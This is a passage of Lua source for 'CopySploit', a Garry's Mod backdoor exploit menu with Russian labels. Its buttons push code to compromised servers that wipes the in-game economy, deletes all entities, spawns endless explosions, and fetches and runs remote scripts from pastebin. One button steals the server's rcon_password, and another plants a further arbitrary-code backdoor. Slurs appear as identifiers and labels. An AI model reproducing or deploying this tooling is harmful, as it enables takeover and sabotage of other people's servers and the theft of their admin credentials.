chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сломано" )
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx10 = vgui.Create("DButton", DScrollPanel)
commandnethtx10:SetSize( 208, 20 )
commandnethtx10:SetPos( 2, 275 )
commandnethtx10:SetText("Обратная гравитация")
commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
commandnethtx10.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx10.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бах" )
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx11 = vgui.Create("DButton", DScrollPanel)
commandnethtx11:SetSize( 208, 20 )
commandnethtx11:SetPos( 2, 300 )
commandnethtx11:SetText("Сбросить все деньги")
commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
commandnethtx11.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx11.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сброшено" )
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
commandnethtx12:SetSize( 208, 20 )
commandnethtx12:SetPos( 2, 325 )
commandnethtx12:SetText("Запустить всех в воздух")
commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
commandnethtx12.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx12.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Ухуу" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
commandnethtx13:SetSize( 208, 20 )
commandnethtx13:SetPos( 2, 350 )
commandnethtx13:SetText("Изменить всем имена")
commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
commandnethtx13.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx13.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Изменено" )
net.Start(thefrenchenculer)
net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name Hacked by CopySploit\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx15 = vgui.Create("DButton", DScrollPanel)
commandnethtx15:SetSize( 208, 20 )
commandnethtx15:SetPos( 2, 400 )
commandnethtx15:SetText("Сломать Экономику")
commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
commandnethtx15.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx15.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сломано" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(99999999999999999) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx16 = vgui.Create("DButton", DScrollPanel)
commandnethtx16:SetSize( 208, 20 )
commandnethtx16:SetPos( 2, 425 )
commandnethtx16:SetText("Порно звуки шагов")
commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
commandnethtx16.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx16.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Ах" )
net.Start(thefrenchenculer)
net.WriteString( "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx17 = vgui.Create("DButton", DScrollPanel)
commandnethtx17:SetSize( 208, 20 )
commandnethtx17:SetPos( 2, 450 )
commandnethtx17:SetText("☢ Удалить все энтити ☢")
commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
commandnethtx17.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx17.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
net.Start(thefrenchenculer)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx18 = vgui.Create("DButton", DScrollPanel)
commandnethtx18:SetSize( 208, 20 )
commandnethtx18:SetPos( 2, 475 )
commandnethtx18:SetText("Хуйня ебаная рот ебал")
commandnethtx18:SetTextColor(Color(255, 255, 255, 255))
commandnethtx18.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx18.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "hellstart/hellend" )
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/LH4NW5yc\",RunString)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx19 = vgui.Create("DButton", DScrollPanel)
commandnethtx19:SetSize( 208, 20 )
commandnethtx19:SetPos( 2, 500 )
commandnethtx19:SetText("-Уши у всех игроков")
commandnethtx19:SetTextColor(Color(255, 255, 255, 255))
commandnethtx19.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx19.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "-уши" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx20 = vgui.Create("DButton", DScrollPanel)
commandnethtx20:SetSize( 208, 20 )
commandnethtx20:SetPos( 2, 525 )
commandnethtx20:SetText("Землетрясение")
commandnethtx20:SetTextColor(Color(255, 255, 255, 255))
commandnethtx20.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx20.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx21 = vgui.Create("DButton", DScrollPanel)
commandnethtx21:SetSize( 208, 20 )
commandnethtx21:SetPos( 2, 550 )
commandnethtx21:SetText("2D модели")
commandnethtx21:SetTextColor(Color(255, 255, 255, 255))
commandnethtx21.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx21.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бах" )
net.Start(thefrenchenculer)
net.WriteString([[
    for k,v in pairs(player.GetAll()) do
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4))
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx22 = vgui.Create("DButton", DScrollPanel)
commandnethtx22:SetSize( 208, 20 )
commandnethtx22:SetPos( 2, 575 )
commandnethtx22:SetText("Армагеддон")
commandnethtx22:SetTextColor(Color(255, 255, 255, 255))
commandnethtx22.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx22.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
local armageddon = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" )
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    explode:Spawn()
                    explode:SetKeyValue( "iMagnitude", "500" )
                    explode:Fire( "Explode", 0, 0 )
                end)
]]
net.Start(thefrenchenculer)
net.WriteString( armageddon )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx23 = vgui.Create("DButton", DScrollPanel)
commandnethtx23:SetSize( 208, 20 )
commandnethtx23:SetPos( 2, 600 )
commandnethtx23:SetText("Сделать всех гигантами")
commandnethtx23:SetTextColor(Color(255, 255, 255, 255))
commandnethtx23.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx23.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все стали гигантами" )
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(thefrenchenculer)
net.WriteString( giant )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx24 = vgui.Create("DButton", DScrollPanel)
commandnethtx24:SetSize( 208, 20 )
commandnethtx24:SetPos( 2, 625 )
commandnethtx24:SetText("Сделать всех высокими")
commandnethtx24:SetTextColor(Color(255, 255, 255, 255))
commandnethtx24.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx24.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все стали высокими" )
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(thefrenchenculer)
net.WriteString( tall )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx25 = vgui.Create("DButton", DScrollPanel)
commandnethtx25:SetSize( 208, 20 )
commandnethtx25:SetPos( 2, 650 )
commandnethtx25:SetText("SpeedHack")
commandnethtx25:SetTextColor(Color(255, 255, 255, 255))
commandnethtx25.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx25.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(thefrenchenculer)
net.WriteString( speedhack )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx26 = vgui.Create("DButton", DScrollPanel)
commandnethtx26:SetSize( 208, 20 )
commandnethtx26:SetPos( 2, 675 )
commandnethtx26:SetText("Кашель всевышнего")
commandnethtx26:SetTextColor(Color(255, 255, 255, 255))
commandnethtx26.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx26.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Кхм" )
net.Start(thefrenchenculer)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "*кхм..кхм*")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx27 = vgui.Create("DButton", DScrollPanel)
commandnethtx27:SetSize( 208, 20 )
commandnethtx27:SetPos( 2, 700 )
commandnethtx27:SetText("Azis - Hop на весь экран")
commandnethtx27:SetTextColor(Color(255, 255, 255, 255))
commandnethtx27.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx27.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запущено" )
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/re1ucyWy\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx28 = vgui.Create("DButton", DScrollPanel)
commandnethtx28:SetSize( 208, 20 )
commandnethtx28:SetPos( 2, 125 )
commandnethtx28:SetText("RCON STEALER")
commandnethtx28:SetTextColor(Color(255, 255, 255, 255))
commandnethtx28.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx28.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/V054AVp3\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if iZNX.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password не найден, попробуйте еще раз ^^" )
end
end )
end
----------------------------------------------------------------------------------------------
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 110, 0 )
RconCommand:SetSize( 100, 20 )
RconCommand:SetText( "hostname Hacked by CopySploit" )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 2, 0 )
Lancer_rcon_commande:SetText("RCON Команда")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
local rcon_commandes_get = RconCommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end
local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 110, 25 )
GLUACommand:SetSize( 100, 20 )
GLUACommand:SetText( "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" ) -- timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 2, 25 )
Lancer_glua_commande:SetText("Lua код")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
local glua_commandes_get = GLUACommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG с этим вы можете ломать сервер, даже если он удалит backdoor :D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Нет rcon_password на сервере :/" )
end )
function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Выберите игрока" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 90, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.SelectPlayersPanel( addr )
if iZNX.PlayerSelector and iZNX.PlayerSelector:IsVisible() then iZNX.PlayerSelector:Remove() end
local plytab = iZNX.GetStored( addr, {} )
iZNX.PlayerSelector = vgui.Create("DFrame")
iZNX.PlayerSelector:SetSize(250,400)
iZNX.PlayerSelector:SetTitle("Выбор цели")
iZNX.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.PlayerSelector:MakePopup()
iZNX.PlayerSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(0, 0, 50, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(50, 50, 90, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", iZNX.PlayerSelector )
Plist:SetSize( iZNX.PlayerSelector:GetWide() - 10, iZNX.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", iZNX.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Все")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
iZNX.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", iZNX.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Никто")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
iZNX.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", iZNX.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Вы")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
iZNX.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", iZNX.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
iZNX.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(0, 0, 70, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
iZNX.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function iZNX.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( iZNX.GetStored( addr, default ) )
tentry.OnChange = function( self )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
function iZNX.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( iZNX.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end

concommand.Add( "CopySploit", function()
LocalPlayer():EmitSound("weapons/ar2/ar2_reload_push.wav",500,100)
iZNX.Menu = vgui.Create("DFrame")
iZNX.Menu:SetSize(950,820)
iZNX.Menu:SetTitle("")
iZNX.Menu:Center()
iZNX.Menu:MakePopup()
